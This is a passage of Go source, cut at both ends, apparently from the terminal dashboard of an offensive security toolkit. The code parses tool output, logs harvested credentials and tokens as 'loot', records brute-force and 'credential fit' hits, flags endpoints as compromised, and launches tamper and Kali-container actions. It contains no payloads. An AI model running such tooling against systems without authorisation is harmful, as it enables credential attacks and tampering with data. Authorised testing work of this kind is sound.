	if err != nil {
		return err
	}
	defer out.Close()
	if _, err := io.Copy(out, in); err != nil {
		return err
	}
	return out.Sync()
}

func countSeverity(items []findingEntry, severity string) int {
	count := 0
	for _, item := range items {
		if item.Severity == severity {
			count++
		}
	}
	return count
}

func countEscalation(items []exploitEntry, escalation string) int {
	count := 0
	for _, item := range items {
		if strings.EqualFold(strings.TrimSpace(item.Escalation), escalation) {
			count++
		}
	}
	return count
}

func uniqueTools(items []commandEntry) []string {
	seen := map[string]bool{}
	tools := []string{}
	for _, item := range items {
		if item.Tool == "" || seen[item.Tool] {
			continue
		}
		seen[item.Tool] = true
		tools = append(tools, item.Tool)
	}
	if len(tools) == 0 {
		return []string{"none"}
	}
	return tools
}

var ansiEscapeRE = regexp.MustCompile(`\x1b\[[0-9;?]*[ -/]*[@-~]`)

func sanitizeTerminalOutput(raw string) string {
	clean := ansiEscapeRE.ReplaceAllString(raw, "")
	clean = strings.ReplaceAll(clean, "\r\n", "\n")
	clean = strings.ReplaceAll(clean, "\r", "\n")
	filtered := strings.Builder{}
	filtered.Grow(len(clean))
	for _, ch := range clean {
		if ch == '\n' || ch == '\t' {
			filtered.WriteRune(ch)
			continue
		}
		if ch < 32 || ch == 127 {
			continue
		}
		filtered.WriteRune(ch)
	}
	return strings.TrimSpace(filtered.String())
}

func parseLastHTTPResponse(output string) (string, map[string]string, string, bool) {
	lines := strings.Split(strings.ReplaceAll(output, "\r\n", "\n"), "\n")
	lastStatus := -1
	for idx, line := range lines {
		if strings.HasPrefix(strings.ToUpper(strings.TrimSpace(line)), "HTTP/") {
			lastStatus = idx
		}
	}
	if lastStatus < 0 {
		return "", nil, "", false
	}
	headers := map[string]string{}
	status := strings.TrimSpace(lines[lastStatus])
	bodyStart := len(lines)
	for idx := lastStatus + 1; idx < len(lines); idx++ {
		line := lines[idx]
		if strings.TrimSpace(line) == "" {
			bodyStart = idx + 1
			break
		}
		colon := strings.Index(line, ":")
		if colon <= 0 {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(line[:colon]))
		value := strings.TrimSpace(line[colon+1:])
		if key != "" {
			headers[key] = value
		}
	}
	body := ""
	if bodyStart < len(lines) {
		body = strings.Join(lines[bodyStart:], "\n")
	}
	return status, headers, strings.TrimSpace(body), true
}

func outputContentType(headers map[string]string, body string) string {
	if headers != nil {
		if raw := strings.ToLower(strings.TrimSpace(headers["content-type"])); raw != "" {
			return strings.TrimSpace(strings.Split(raw, ";")[0])
		}
	}
	trimmed := strings.TrimSpace(body)
	switch {
	case strings.HasPrefix(trimmed, "{"), strings.HasPrefix(trimmed, "["):
		return "application/json"
	case strings.HasPrefix(strings.ToLower(trimmed), "<!doctype html"), strings.HasPrefix(strings.ToLower(trimmed), "<html"), strings.Contains(strings.ToLower(trimmed), "<body"):
		return "text/html"
	case strings.HasPrefix(trimmed, "<") && strings.Contains(trimmed, ">"):
		return "application/xml"
	case strings.Contains(trimmed, ",") && strings.Count(trimmed, "\n") >= 1:
		return "text/csv"
	default:
		return "text/plain"
	}
}

func parseJSONBody(raw string) (any, bool) {
	var value any
	if err := json.Unmarshal([]byte(strings.TrimSpace(raw)), &value); err != nil {
		return nil, false
	}
	return value, true
}

func truncateValue(value any, limit int) string {
	text := fmt.Sprintf("%v", value)
	return truncate(strings.TrimSpace(text), max(6, limit))
}

func renderJSONArrayRows(entries []any, width, maxRows int) []string {
	if maxRows < 1 {
		maxRows = 1
	}
	preferredIDKeys := []string{"id", "_id", "uuid", "key", "slug", "hash", "txHash", "address"}
	preferredLabelKeys := []string{"name", "title", "label", "username", "email", "symbol", "status"}
	lines := []string{}
	for idx, entry := range entries {
		if idx >= maxRows {
			lines = append(lines, fmt.Sprintf("+%d rows omitted", len(entries)-idx))
			break
		}
		switch row := entry.(type) {
		case map[string]any:
			keys := make([]string, 0, len(row))
			for key := range row {
				keys = append(keys, key)
			}
			sort.Strings(keys)
			idKey := ""
			for _, key := range preferredIDKeys {
				if _, ok := row[key]; ok {
					idKey = key
					break
				}
			}
			labelKey := ""
			for _, key := range preferredLabelKeys {
				if _, ok := row[key]; ok {
					labelKey = key
					if key != idKey {
						break
					}
				}
			}
			summaryParts := []string{fmt.Sprintf("row[%d]", idx)}
			if idKey != "" {
				summaryParts = append(summaryParts, fmt.Sprintf("%s=%s", idKey, truncateValue(row[idKey], 18)))
			}
			if labelKey != "" {
				summaryParts = append(summaryParts, fmt.Sprintf("%s=%s", labelKey, truncateValue(row[labelKey], max(12, width-32))))
			}
			if len(summaryParts) == 1 && len(keys) > 0 {
				firstKey := keys[0]
				summaryParts = append(summaryParts, fmt.Sprintf("%s=%s", firstKey, truncateValue(row[firstKey], max(12, width-24))))
			}
			lines = append(lines, "- "+strings.Join(summaryParts, " "))
			keyCount := 0
			for _, key := range keys {
				if key == idKey || key == labelKey {
					continue
				}
				val := row[key]
				switch val.(type) {
				case map[string]any, []any:
					continue
				}
				lines = append(lines, fmt.Sprintf("  %s=%s", key, truncateValue(val, max(8, width-14))))
				keyCount++
				if keyCount >= 3 {
					break
				}
			}
		default:
			lines = append(lines, fmt.Sprintf("- row[%d] %s", idx, truncateValue(entry, max(12, width-10))))
		}
	}
	return lines
}

func renderJSONBodyStructured(body string, width int) string {
	value, ok := parseJSONBody(body)
	if !ok {
		return wrap(truncate(body, max(24, width*3)), width)
	}
	switch typed := value.(type) {
	case map[string]any:
		keys := make([]string, 0, len(typed))
		for key := range typed {
			keys = append(keys, key)
		}
		sort.Strings(keys)
		lines := []string{metricLine("json type", "object"), metricLine("fields", fmt.Sprintf("%d", len(keys)))}
		if dataField, exists := typed["data"]; exists {
			if rows, ok := dataField.([]any); ok {
				lines = append(lines, metricLine("data rows", fmt.Sprintf("%d", len(rows))))
				lines = append(lines, renderJSONArrayRows(rows, width, 10)...)
				return strings.Join(lines, "\n")
			}
		}
		for idx, key := range keys {
			if idx >= 12 {
				lines = append(lines, fmt.Sprintf("+%d fields omitted", len(keys)-idx))
				break
			}
			lines = append(lines, fmt.Sprintf("- %s: %s", key, truncateValue(typed[key], max(16, width-8))))
		}
		return strings.Join(lines, "\n")
	case []any:
		lines := []string{metricLine("json type", "array"), metricLine("rows", fmt.Sprintf("%d", len(typed)))}
		lines = append(lines, renderJSONArrayRows(typed, width, 10)...)
		return strings.Join(lines, "\n")
	default:
		pretty, _ := json.MarshalIndent(value, "", "  ")
		return wrap(string(pretty), width)
	}
}

func renderHTMLBodyStructured(body string, width int) string {
	lower := strings.ToLower(body)
	title := "n/a"
	if match := regexp.MustCompile(`(?is)<title[^>]*>(.*?)</title>`).FindStringSubmatch(body); len(match) > 1 {
		title = strings.TrimSpace(regexp.MustCompile(`\s+`).ReplaceAllString(match[1], " "))
	}
	linkCount := strings.Count(lower, "<a ")
	formCount := strings.Count(lower, "<form")
	scriptCount := strings.Count(lower, "<script")
	text := regexp.MustCompile(`(?is)<script.*?</script>|<style.*?</style>|<[^>]+>`).ReplaceAllString(body, " ")
	text = strings.TrimSpace(regexp.MustCompile(`\s+`).ReplaceAllString(text, " "))
	return strings.Join([]string{
		metricLine("content", "html"),
		metricLine("title", truncate(title, max(20, width-10))),
		metricLine("links/forms/scripts", fmt.Sprintf("%d / %d / %d", linkCount, formCount, scriptCount)),
		metricLine("text", truncate(text, max(20, width*2))),
	}, "\n")
}

func renderXMLBodyStructured(body string, width int) string {
	root := "unknown"
	if match := regexp.MustCompile(`(?s)<([a-zA-Z0-9:_-]+)(\s|>)`).FindStringSubmatch(body); len(match) > 1 {
		root = match[1]
	}
	return strings.Join([]string{
		metricLine("content", "xml"),
		metricLine("root", root),
		metricLine("preview", truncate(strings.TrimSpace(body), max(24, width*2))),
	}, "\n")
}

func renderCSVBodyStructured(body string, width int) string {
	lines := strings.Split(strings.TrimSpace(body), "\n")
	if len(lines) == 0 {
		return "empty csv body"
	}
	header := strings.Split(lines[0], ",")
	out := []string{
		metricLine("content", "csv"),
		metricLine("columns", fmt.Sprintf("%d", len(header))),
		metricLine("rows", fmt.Sprintf("%d", max(0, len(lines)-1))),
		metricLine("header", truncate(strings.Join(header, " | "), max(18, width-12))),
	}
	for idx := 1; idx < len(lines) && idx < 5; idx++ {
		out = append(out, fmt.Sprintf("- row[%d] %s", idx-1, truncate(lines[idx], max(16, width-10))))
	}
	return strings.Join(out, "\n")
}

func renderStructuredCommandOutput(output string, width int, raw bool) string {
	clean := strings.TrimSpace(sanitizeTerminalOutput(output))
	if clean == "" {
		return "no graph command output yet"
	}
	if raw {
		return wrap(clean, width)
	}
	status, headers, body, isHTTP := parseLastHTTPResponse(clean)
	content := body
	if !isHTTP {
		content = clean
	}
	ctype := outputContentType(headers, content)
	lines := []string{}
	if isHTTP {
		lines = append(lines, metricLine("http", status))
	}
	lines = append(lines, metricLine("content-type", ctype))
	lines = append(lines, "")
	switch {
	case strings.Contains(ctype, "json"):
		lines = append(lines, renderJSONBodyStructured(content, width))
	case strings.Contains(ctype, "html"):
		lines = append(lines, renderHTMLBodyStructured(content, width))
	case strings.Contains(ctype, "xml"):
		lines = append(lines, renderXMLBodyStructured(content, width))
	case strings.Contains(ctype, "csv"):
		lines = append(lines, renderCSVBodyStructured(content, width))
	default:
		lines = append(lines, metricLine("content", "plain"))
		lines = append(lines, wrap(truncate(content, max(24, width*3)), width))
	}
	lines = append(lines, "", lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render("press v for raw output"))
	return strings.Join(lines, "\n")
}

func extractJSONTemplate(body string) (string, bool) {
	value, ok := parseJSONBody(body)
	if !ok {
		return "", false
	}
	extract := func(obj map[string]any) (string, bool) {
		if obj == nil {
			return "", false
		}
		delete(obj, "id")
		delete(obj, "createdAt")
		delete(obj, "updatedAt")
		delete(obj, "deletedAt")
		if len(obj) == 0 {
			return "", false
		}
		serialized, err := json.Marshal(obj)
		if err != nil {
			return "", false
		}
		return string(serialized), true
	}
	switch typed := value.(type) {
	case map[string]any:
		return extract(typed)
	case []any:
		for _, item := range typed {
			if obj, ok := item.(map[string]any); ok {
				if serialized, valid := extract(obj); valid {
					return serialized, true
				}
			}
		}
	}
	return "", false
}

func (m *model) applyArchEditHints(msg archGraphResultMsg) {
	if strings.TrimSpace(msg.Output) == "" {
		return
	}
	_, headers, body, isHTTP := parseLastHTTPResponse(msg.Output)
	content := body
	if !isHTTP {
		content = msg.Output
	}
	ctype := outputContentType(headers, content)
	if strings.Contains(ctype, "json") {
		if template, ok := extractJSONTemplate(content); ok {
			m.archEditPayload = template
			m.archEditEnabled = true
		}
	}
	if strings.TrimSpace(msg.Target) != "" {
		m.archEditEndpoint = strings.TrimSpace(msg.Target)
		m.archEditEnabled = true
	}
	if strings.TrimSpace(msg.Role) == "MODIFY" || strings.TrimSpace(msg.Role) == "TAMPER" {
		m.archEditEnabled = true
	}
	m.syncArchEditableFieldSelection()
}

func credentialFitEndpointsFromOutput(output string) []string {
	re := regexp.MustCompile(`(?m)^CRED_FIT\s+endpoint=([^\s]+)`)
	matches := re.FindAllStringSubmatch(output, -1)
	out := []string{}
	seen := map[string]bool{}
	for _, match := range matches {
		if len(match) < 2 {
			continue
		}
		endpoint := strings.TrimSpace(match[1])
		if endpoint == "" {
			continue
		}
		key := strings.ToLower(endpoint)
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, endpoint)
	}
	return out
}

func credentialFitTag(endpoints []string) string {
	unique := credentialFitTargetLabels(endpoints, 2)
	if len(unique) == 0 {
		return "[VALIDATED] auth-fit"
	}
	return "[VALIDATED] auth-fit @ " + strings.Join(unique, ", ")
}

func credentialFitTargetLabels(endpoints []string, maxItems int) []string {
	if maxItems < 1 {
		maxItems = 1
	}
	unique := []string{}
	seen := map[string]bool{}
	for _, endpoint := range endpoints {
		trimmed := strings.TrimSpace(endpoint)
		if trimmed == "" {
			continue
		}
		label := credentialFitEndpointLabel(trimmed)
		key := strings.ToLower(label)
		if key == "" || seen[key] {
			continue
		}
		seen[key] = true
		unique = append(unique, label)
		if len(unique) >= maxItems {
			break
		}
	}
	return unique
}

func credentialFitEndpointLabel(endpoint string) string {
	trimmed := strings.TrimSpace(endpoint)
	if trimmed == "" {
		return ""
	}
	parsed, err := url.Parse(trimmed)
	if err != nil {
		return truncate(trimmed, 72)
	}
	path := strings.TrimSpace(parsed.EscapedPath())
	if path != "" && path != "/" {
		return truncate(path, 72)
	}
	host := strings.TrimSpace(parsed.Host)
	if host != "" {
		return truncate(host, 72)
	}
	return truncate(trimmed, 72)
}

func credentialFitAccessName(endpoints []string) string {
	targets := credentialFitTargetLabels(endpoints, 2)
	if len(targets) == 0 {
		return "auth-fit"
	}
	return "auth-fit -> " + strings.Join(targets, ", ")
}

func stripCredentialConfidenceWords(name string) string {
	trimmed := strings.TrimSpace(name)
	if trimmed == "" {
		return "credential material"
	}
	re := regexp.MustCompile(`(?i)\b(potential|possible|candidate|validated)\b`)
	cleaned := strings.TrimSpace(re.ReplaceAllString(trimmed, ""))
	cleaned = strings.Join(strings.Fields(cleaned), " ")
	cleaned = strings.Trim(cleaned, "-_:|[] ")
	if cleaned == "" {
		return "credential material"
	}
	return cleaned
}

func annotateLatestCredentialLootWithFit(root string, endpoints []string) bool {
	path := filepath.Join(root, "telemetry", "loot.jsonl")
	data, err := os.ReadFile(path)
	if err != nil {
		return false
	}
	raw := strings.TrimSpace(string(data))
	if raw == "" {
		return false
	}
	lines := strings.Split(raw, "\n")
	tag := credentialFitTag(endpoints)
	bestIdx := -1
	bestScore := -1
	for idx := 0; idx < len(lines); idx++ {
		line := strings.TrimSpace(lines[idx])
		if line == "" {
			continue
		}
		var item lootEntry
		if err := json.Unmarshal([]byte(line), &item); err != nil {
			continue
		}
		kind := strings.ToLower(strings.TrimSpace(item.Kind))
		if kind == "credential-fit" {
			continue
		}
		if kind != "credential" && kind != "token" && kind != "jwt" {
			continue
		}
		meta := strings.ToLower(strings.TrimSpace(item.Kind + " " + item.Name + " " + item.Source + " " + item.Preview))
		if !isCredentialSignalMeta(meta) {
			continue
		}
		existing := strings.ToLower(strings.TrimSpace(item.Name + " " + item.Preview))
		if strings.Contains(existing, "credential fit validated") || strings.Contains(existing, "validated credential") ||
			strings.Contains(existing, "[validated] auth-fit") || strings.Contains(existing, "auth-fit ->") {
			continue
		}
		score := 0
		switch kind {
		case "credential":
			score += 5
		case "token", "jwt":
			score += 3
		}
		nameLower := strings.ToLower(strings.TrimSpace(item.Name))
		if strings.Contains(nameLower, "potential") || strings.Contains(nameLower, "possible") || strings.Contains(nameLower, "candidate") {
			score += 8
		}
		if strings.Contains(nameLower, "credential") || strings.Contains(nameLower, "creds") {
			score += 2
		}
		sourceLower := strings.ToLower(strings.TrimSpace(item.Source))
		if strings.Contains(sourceLower, "artifacts/") {
			score -= 6
		}
		if strings.Contains(meta, "username") || strings.Contains(meta, "password") || strings.Contains(meta, "login") || strings.Contains(meta, "user=") || strings.Contains(meta, "pass=") {
			score += 3
		}
		if score < 1 {
			continue
		}
		if score > bestScore || (score == bestScore && idx > bestIdx) {
			bestScore = score
			bestIdx = idx
		}
	}
	if bestIdx < 0 {
		return false
	}
	line := strings.TrimSpace(lines[bestIdx])
	var item lootEntry
	if err := json.Unmarshal([]byte(line), &item); err != nil {
		return false
	}
	baseName := stripCredentialConfidenceWords(item.Name)
	item.Name = truncate(strings.TrimSpace(baseName+" -> "+credentialFitAccessName(endpoints)), 180)
	preview := strings.TrimSpace(item.Preview)
	if preview == "" {
		item.Preview = tag
	} else {
		item.Preview = truncate(preview+" | "+tag, 320)
	}
	serialized, err := json.Marshal(item)
	if err != nil {
		return false
	}
	lines[bestIdx] = string(serialized)
	content := strings.Join(lines, "\n")
	if strings.TrimSpace(content) != "" {
		content += "\n"
	}
	return os.WriteFile(path, []byte(content), 0o644) == nil
}

func (m *model) applyCredentialFitSignals(output string) bool {
	endpoints := credentialFitEndpointsFromOutput(output)
	if len(endpoints) == 0 {
		return false
	}
	now := time.Now().UTC().Format(time.RFC3339)
	lootPath := filepath.Join(m.root, "telemetry", "loot.jsonl")
	findingPath := filepath.Join(m.root, "telemetry", "findings.jsonl")
	wrote := false
	existingLoot := loadJSONL[lootEntry](lootPath)
	existingFindings := loadJSONL[findingEntry](findingPath)
	knownLoot := map[string]bool{}
	knownFindings := map[string]bool{}
	for _, item := range existingLoot {
		if !strings.EqualFold(strings.TrimSpace(item.Kind), "credential-fit") {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(item.Source))
		if key != "" {
			knownLoot[key] = true
		}
	}
	for _, item := range existingFindings {
		if !strings.Contains(strings.ToLower(strings.TrimSpace(item.Title)), "credential fit") {
			continue
		}
		key := strings.ToLower(strings.TrimSpace(item.Endpoint))
		if key != "" {
			knownFindings[key] = true
		}
	}
	for _, endpoint := range endpoints {
		key := strings.ToLower(strings.TrimSpace(endpoint))
		if key == "" {
			continue
		}
		lootItem := lootEntry{
			Timestamp: now,
			Kind:      "credential-fit",
			Name:      "credential fit",
			Source:    endpoint,
			Preview:   "credential fit scan confirmed authenticated response delta",
		}
		findingItem := findingEntry{
			Timestamp: now,
			Severity:  "high",
			Title:     "Credential fit validated",
			Endpoint:  endpoint,
			Evidence:  "map credential fit scan discovered endpoint auth fit",
			Impact:    "credentials/token can authenticate against discovered endpoint",
			Phase:     "exploit",
		}
		if !knownLoot[key] && appendLootJSONL(lootPath, lootItem) == nil {
			knownLoot[key] = true
			wrote = true
		}
		if !knownFindings[key] && appendFindingJSONL(findingPath, findingItem) == nil {
			knownFindings[key] = true
			wrote = true
		}
	}
	if annotateLatestCredentialLootWithFit(m.root, endpoints) {
		wrote = true
	}
	return wrote
}

func (m *model) applyArchResultSignals(msg archGraphResultMsg) {
	if m.applyCredentialFitSignals(msg.Output) {
		m.reload()
	}
}

type bruteHit struct {
	Endpoint string
	Method   string
	User     string
	Code     string
}

func bruteHitsFromOutput(output string) []bruteHit {
	re := regexp.MustCompile(`(?m)^BRUTE_HIT\s+endpoint=([^\s]+)\s+method=([^\s]+)\s+user=([^\s]+)\s+code=([0-9]{3})`)
	matches := re.FindAllStringSubmatch(output, -1)
	out := []bruteHit{}
	seen := map[string]bool{}
	for _, match := range matches {
		if len(match) < 5 {
			continue
		}
		item := bruteHit{
			Endpoint: strings.TrimSpace(match[1]),
			Method:   strings.TrimSpace(match[2]),
			User:     strings.TrimSpace(match[3]),
			Code:     strings.TrimSpace(match[4]),
		}
		key := strings.ToLower(item.Endpoint + "|" + item.Method + "|" + item.User + "|" + item.Code)
		if key == "" || seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, item)
	}
	return out
}

func normalizeEndpointKey(baseURL, endpoint string) string {
	normalized := strings.TrimSpace(normalizeLootEndpoint(baseURL, endpoint))
	if normalized == "" {
		return ""
	}
	parsed, err := url.Parse(normalized)
	if err == nil {
		parsed.Fragment = ""
		parsed.RawQuery = ""
		parsed.Path = strings.TrimRight(parsed.Path, "/")
		if parsed.Path == "" {
			parsed.Path = "/"
		}
		normalized = parsed.String()
	}
	return strings.ToLower(strings.TrimSpace(normalized))
}

func (m model) brutePreflightWarning(endpoint string) string {
	base := strings.TrimSpace(m.state.TargetURL)
	if base == "" {
		return ""
	}
	key := normalizeEndpointKey(base, endpoint)
	if key == "" {
		return ""
	}
	exploitLoot := lootByMode(m.loot, "exploit")
	exploitFindings := findingsByMode(m.findings, "exploit")
	knownCredFit := false
	alreadyPwned := false

	for _, item := range exploitLoot {
		meta := strings.ToLower(strings.TrimSpace(item.Kind + " " + item.Name + " " + item.Preview))
		sourceKey := normalizeEndpointKey(base, item.Source)
		if sourceKey != key {
			continue
		}
		if strings.EqualFold(strings.TrimSpace(item.Kind), "credential-fit") ||
			strings.Contains(meta, "credential fit") ||
			strings.Contains(meta, "brute auth hit") {
			knownCredFit = true
		}
		if strings.Contains(meta, "pwn") ||
			strings.Contains(meta, "write probe") ||
			strings.Contains(meta, "tamper") ||
			strings.Contains(meta, "credential fit") {
			alreadyPwned = true
		}
	}
	for _, item := range exploitFindings {
		endpointKey := normalizeEndpointKey(base, item.Endpoint)
		if endpointKey != key {
			continue
		}
		meta := strings.ToLower(strings.TrimSpace(item.Title + " " + item.Evidence + " " + item.Impact + " " + item.Severity))
		if strings.Contains(meta, "credential fit") ||
			strings.Contains(meta, "credential attack hit validated") ||
			strings.Contains(meta, "auth hit validated") {
			knownCredFit = true
		}
		if strings.EqualFold(strings.TrimSpace(item.Severity), "critical") ||
			strings.EqualFold(strings.TrimSpace(item.Severity), "high") ||
			strings.Contains(meta, "pwn") ||
			strings.Contains(meta, "unauthorized") ||
			strings.Contains(meta, "tamper") ||
			strings.Contains(meta, "write") {
			alreadyPwned = true
		}
	}

	parts := []string{}
	if knownCredFit {
		parts = append(parts, "known credential-fit already exists for endpoint")
	}
	if alreadyPwned {
		parts = append(parts, "endpoint already has high-confidence compromise signals")
	}
	return strings.Join(parts, " | ")
}

func (m *model) applyControlResultSignals(msg controlResultMsg) {
	commandMeta := strings.ToLower(strings.TrimSpace(msg.Command + " " + msg.Label))
	if strings.Contains(commandMeta, "telemetryctl.py new-campaign") {
		m.telemetryDir = detectTelemetryDir(m.root)
		m.reload()
	}
	wrote := m.applyCredentialFitSignals(msg.Output)
	hits := bruteHitsFromOutput(msg.Output)
	if len(hits) == 0 {
		if wrote {
			m.reload()
		}
		return
	}
	now := time.Now().UTC().Format(time.RFC3339)
	lootPath := filepath.Join(m.root, "telemetry", "loot.jsonl")
	findingPath := filepath.Join(m.root, "telemetry", "findings.jsonl")
	for _, hit := range hits {
		lootItem := lootEntry{
			Timestamp: now,
			Kind:      "credential-fit",
			Name:      "brute auth hit :: " + hit.Method,
			Source:    hit.Endpoint,
			Preview:   truncate("user="+hit.User+" code="+hit.Code+" method="+hit.Method, 220),
		}
		findingItem := findingEntry{
			Timestamp: now,
			Severity:  "high",
			Title:     "Credential attack hit validated",
			Endpoint:  hit.Endpoint,
			Evidence:  "method=" + hit.Method + " user=" + hit.User + " code=" + hit.Code,
			Impact:    "authenticated access candidate validated by adaptive brute workflow",
			Phase:     "exploit",
		}
		if err := appendLootJSONL(lootPath, lootItem); err == nil {
			wrote = true
		}
		if err := appendFindingJSONL(findingPath, findingItem); err == nil {
			wrote = true
		}
	}
	if wrote {
		m.reload()
	}
}

func wrap(text string, width int) string {
	if width < 12 {
		width = 12
	}
	words := strings.Fields(strings.ReplaceAll(text, "\n", " "))
	if len(words) == 0 {
		return ""
	}
	lines := []string{}
	line := ""
	for _, word := range words {
		if len(line)+1+len(word) > width && line != "" {
			lines = append(lines, line)
			line = word
			continue
		}
		if line == "" {
			line = word
		} else {
			line += " " + word
		}
	}
	if line != "" {
		lines = append(lines, line)
	}
	return strings.Join(lines, "\n")
}

func clipBody(body string, height, offset int) (string, string) {
	lines := strings.Split(body, "\n")
	if height < 1 {
		height = 1
	}
	if len(lines) <= height {
		return body, ""
	}
	maxOffset := max(0, len(lines)-height)
	offset = clamp(offset, 0, maxOffset)
	return strings.Join(lines[offset:offset+height], "\n"), fmt.Sprintf("scroll %d/%d", offset+1, maxOffset+1)
}

func autoPaneScrollOffset(body string, outerHeight int, selectedLine int) int {
	lines := strings.Split(body, "\n")
	if len(lines) == 0 {
		return 0
	}
	innerHeight := max(3, outerHeight-4)
	if len(lines) <= innerHeight {
		return 0
	}
	selectedLine = clamp(selectedLine, 0, len(lines)-1)
	maxOffset := max(0, len(lines)-innerHeight)
	targetOffset := selectedLine - innerHeight/2
	return clamp(targetOffset, 0, maxOffset)
}

func lootListSelectedLineIndex(loot []lootEntry, order []int, selected int, osintMode, onchainMode bool) int {
	if len(order) == 0 {
		return 0
	}
	if indexInOrder(order, selected) < 0 {
		selected = order[0]
	}
	line := 0
	currentGroup := ""
	for _, idx := range order {
		if idx < 0 || idx >= len(loot) {
			continue
		}
		item := loot[idx]
		group := lootCompartment(item.Kind)
		if osintMode {
			group = osintLootToolBucket(item)
		}
		if onchainMode {
			group = onchainLootToolBucket(item)
		}
		if group != currentGroup {
			currentGroup = group
			line++
		}
		if idx == selected {
			return line
		}
		line++
		line++
		if (osintMode || onchainMode) && strings.TrimSpace(item.Preview) != "" {
			line++
		}
	}
	return 0
}

func (m *model) triggerControlAction() tea.Cmd {
	if m.controlBusy {
		m.controlStatus = "busy :: previous command still running"
		return nil
	}
	actions := m.activeControlActions()
	if len(actions) == 0 {
		m.controlStatus = "no available actions in this pane"
		return nil
	}
	idx := m.activeControlIndex()
	if idx < 0 || idx >= len(actions) {
		idx = 0
	}
	action := actions[idx]
	if action.Mode == "internal" {
		m.applyInternalAction(action)
		return nil
	}
	if isNewCampaignAction(action) && !m.confirmNewCampaign {
		m.confirmNewCampaign = true
		m.controlStatus = "confirm required :: press Enter/f again to start new campaign"
		m.controlOutcome = "idle"
		m.controlUntil = time.Now().Add(2500 * time.Millisecond)
		return nil
	}
	if isNewCampaignAction(action) {
		m.confirmNewCampaign = false
	}
	if ok, reason := m.preflightControlAction(action); !ok {
		m.controlStatus = "preflight failed :: " + reason
		m.controlOutcome = "failed"
		m.controlUntil = time.Now().Add(1900 * time.Millisecond)
		m.controlPreflightWarning = ""
		m.controlLastLabel = action.Label
		m.controlLastCommand = action.Command
		m.controlOutput = ""
		return nil
	} else {
		m.controlPreflightWarning = strings.TrimSpace(reason)
	}
	if action.Mode == "local" && len(action.Args) == 0 {
		m.controlStatus = "invalid action :: no command args"
		m.controlOutcome = "failed"
		m.controlUntil = time.Now().Add(1900 * time.Millisecond)
		m.controlPreflightWarning = ""
		return nil
	}
	if action.Mode == "kali" && strings.TrimSpace(action.KaliShell) == "" {
		m.controlStatus = "invalid action :: no kali command"
		m.controlOutcome = "failed"
		m.controlUntil = time.Now().Add(1900 * time.Millisecond)
		m.controlPreflightWarning = ""
		return nil
	}
	m.controlBusy = true
	m.controlStatus = "running :: " + action.Label
	if strings.TrimSpace(m.controlPreflightWarning) != "" {
		m.controlStatus += " :: preflight-warn"
	}
	m.controlOutcome = "running"
	m.controlOutput = ""
	m.controlDetailScroll = 0
	return controlCmd(m.root, action, m.currentControlTelemetryPhase())
}

func isNewCampaignAction(action controlAction) bool {
	meta := strings.ToLower(strings.TrimSpace(action.Command + " " + strings.Join(action.Args, " ")))
	return strings.Contains(meta, "telemetryctl.py new-campaign")
}

func (m *model) triggerArchGraphAction() tea.Cmd {
	if m.archGraphBusy {
		m.archGraphStatus = "busy :: previous map command still running"
		return nil
	}
	node, selected, ok := m.selectedArchNodeAndAction()
	if !ok {
		m.archGraphStatus = "no graph node selected"
		return nil
	}
	action := selected
	if edited, useEdited := m.buildArchEditAction(node, selected); useEdited {
		action = edited
	}
	if strings.EqualFold(strings.TrimSpace(action.Mode), "internal") {
		m.applyInternalArchGraphAction(node, action)
		return nil
	}
	role := graphActionRole(action)
	target := endpointFromAction(action)
	if strings.TrimSpace(target) == "" {
		target = m.archEditEndpoint
	}
	if strings.TrimSpace(action.Command) == "" && strings.TrimSpace(action.KaliShell) == "" {
		m.archGraphStatus = "node has no runnable explore command"
		return nil
	}
	if ok, reason := m.preflightArchGraphAction(action); !ok {
		if strings.TrimSpace(reason) != "" {
			m.archGraphStatus = "blocked :: " + reason
		} else {
			m.archGraphStatus = "blocked :: action cannot run"
		}
		return nil
	}
	m.archGraphBusy = true
	m.archGraphStatus = "running :: " + node.Label + " :: " + truncate(action.Label, 42)
	m.archGraphOutcome = "running"
	m.archGraphOutput = ""
	return archGraphCmd(m.root, node, action, role, target)
}

func (m *model) applyInternalArchGraphAction(node attackGraphNode, action controlAction) {
	command := strings.TrimSpace(action.Command)
	if strings.HasPrefix(command, "arch:editor:load?") {
		query := strings.TrimPrefix(command, "arch:editor:load?")
		values, err := url.ParseQuery(query)
		if err != nil {
			m.archGraphStatus = "editor load failed :: invalid action payload"
			return
		}
		endpoint := strings.TrimSpace(values.Get("endpoint"))
		if endpoint == "" {
			m.archGraphStatus = "editor load failed :: missing endpoint"
			return
		}
		payload := strings.TrimSpace(values.Get("payload"))
		if payload == "" {
			payload = "{}"
		}
		method := strings.ToUpper(strings.TrimSpace(values.Get("method")))
		if method == "" {
			method = "PATCH"
		}
		m.archEditEndpoint = endpoint
		m.archEditPayload = payload
		m.archEditMethod = method
		m.archEditEnabled = true
		m.syncArchEditableFieldSelection()
		m.archGraphCommand = command
		m.archGraphStatus = "editor loaded :: " + truncate(action.Label, 58)
		m.archGraphOutput = strings.Join([]string{
			metricLine("editor", "loaded from listing"),
			metricLine("node", valueOr(strings.TrimSpace(node.Label), "selected node")),
			metricLine("method", method),
			metricLine("endpoint", endpoint),
			metricLine("payload", truncate(payload, 220)),
			"",
			lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Render("next"),
			"adjust endpoint/payload with e/p/y/t, then press f to execute",
		}, "\n")
		m.commandDetailScroll = 0
		return
	}
	m.archGraphStatus = "internal map action not mapped :: " + truncate(action.Label, 48)
}

func (m model) activeControlActions() []controlAction {
	switch m.controlSection {
	case 0:
		return m.launchActions()
	case 1:
		return m.targetActions()
	case 2:
		return m.filterUnsupportedKaliActions(m.fireActions())
	default:
		return m.historyActions()
	}
}

func (m model) filterUnsupportedKaliActions(actions []controlAction) []controlAction {
	if len(actions) == 0 {
		return actions
	}
	if !kaliRuntimeRunningCached(kaliContainerName()) {
		return actions
	}
	filtered := make([]controlAction, 0, len(actions))
	for _, action := range actions {
		if !strings.EqualFold(strings.TrimSpace(action.Mode), "kali") {
			filtered = append(filtered, action)
			continue
		}
		requiredTool := m.requiredKaliTool(action)
		if strings.TrimSpace(requiredTool) == "" {
			filtered = append(filtered, action)
			continue
		}
		if available, _ := kaliToolAvailableCached(kaliContainerName(), requiredTool); available {
			filtered = append(filtered, action)
		}
	}
	if len(filtered) == 0 {
		return []controlAction{
			{
